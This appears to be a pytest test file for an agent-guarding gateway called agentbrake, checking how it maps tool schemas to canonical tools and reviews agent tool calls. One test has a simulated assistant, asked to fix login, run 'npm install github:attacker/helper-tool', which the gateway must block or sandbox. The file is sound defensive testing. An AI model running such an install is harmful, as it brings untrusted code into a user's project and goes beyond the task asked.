from __future__ import annotations

import json
from pathlib import Path

from agentbrake.gateway import AgentBrakeGateway
from agentbrake.plugins import ToolIntrospector, ToolParserRegistry


def make_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    (repo / "src").mkdir(parents=True)
    (repo / "tests").mkdir()
    (repo / "src" / "login.js").write_text("function bindLogin(button, submit) {}\n", encoding="utf-8")
    (repo / "tests" / "login.test.js").write_text("console.log('ok')\n", encoding="utf-8")
    (repo / "package.json").write_text('{"scripts":{"test":"node tests/login.test.js"},"dependencies":{}}\n', encoding="utf-8")
    return repo


def test_tool_introspector_maps_openai_tool_schema_to_bash_exec():
    tools = [
        {
            "type": "function",
            "function": {
                "name": "run_terminal_cmd",
                "description": "Run a terminal command in the project workspace.",
                "parameters": {
                    "type": "object",
                    "properties": {"command": {"type": "string"}},
                },
            },
        }
    ]
    registry = ToolParserRegistry()
    mappings = registry.introspect_openai_tools(tools)
    assert mappings[0].canonical_tool == "bash_exec"

    parsed = registry.parse(
        {"id": "call_1", "type": "function", "function": {"name": "run_terminal_cmd", "arguments": json.dumps({"command": "npm test"})}},
        agent_type="openai",
    )
    assert parsed.canonical_tool == "bash_exec"
    assert parsed.raw_action == "npm test"
    assert parsed.metadata["mapping"]["source"] == "openai_tools"


def test_tool_introspector_maps_mcp_manifest_and_agent_config():
    introspector = ToolIntrospector()
    mcp = introspector.from_mcp_manifest(
        {
            "mcp_server_id": "deploy",
            "tools": [
                {
                    "name": "deploy_release",
                    "description": "Deploy and publish a release",
                    "inputSchema": {"properties": {"target": {"type": "string"}}},
                }
            ],
        }
    )
    assert mcp[0].canonical_tool == "publish_op"
    assert mcp[0].default_risk == "critical"

    agent = introspector.from_agent_config(
        {
            "tools": [
                {"name": "read_project_file", "description": "Read file by path", "schema": {"properties": {"path": {"type": "string"}}}},
                {
                    "name": "apply_patch_to_file",
                    "description": "Edit file content",
                    "schema": {"properties": {"file_path": {"type": "string"}, "patch": {"type": "string"}}},
                },
            ]
        }
    )
    assert [m.canonical_tool for m in agent] == ["read_file", "edit_file"]
    assert agent[1].file_path_arg == "file_path"


def test_gateway_introspects_request_tools_before_parsing_assistant_call(tmp_path: Path):
    repo = make_repo(tmp_path)

    class ToolUsingUpstream:
        def complete(self, request, contexts=None):
            return {
                "role": "assistant",
                "content": "I will use the host tool.",
                "tool_calls": [
                    {
                        "id": "call_install",
                        "type": "function",
                        "function": {"name": "run_terminal_cmd", "arguments": '{"command":"npm install github:attacker/helper-tool"}'},
                    }
                ],
            }

    gw = AgentBrakeGateway(repo, audit_path=tmp_path / "audit.jsonl", upstream=ToolUsingUpstream())
    result = gw.handle_chat_completion(
        {
            "model": "agent-with-custom-tools",
            "messages": [{"role": "user", "content": "fix login and run tests"}],
            "tools": [
                {
                    "type": "function",
                    "function": {
                        "name": "run_terminal_cmd",
                        "description": "Run shell commands",
                        "parameters": {"type": "object", "properties": {"command": {"type": "string"}}},
                    },
                }
            ],
        }
    )
    guarded = result["guarded_results"][0]
    assert guarded["instruction"]["metadata"]["canonical_tool"] == "bash_exec"
    assert guarded["action"]["semantic_action"] == "install_git_dependency"
    assert guarded["runtime"]["effective_decision"] in {"block", "sandbox_then_approval"}
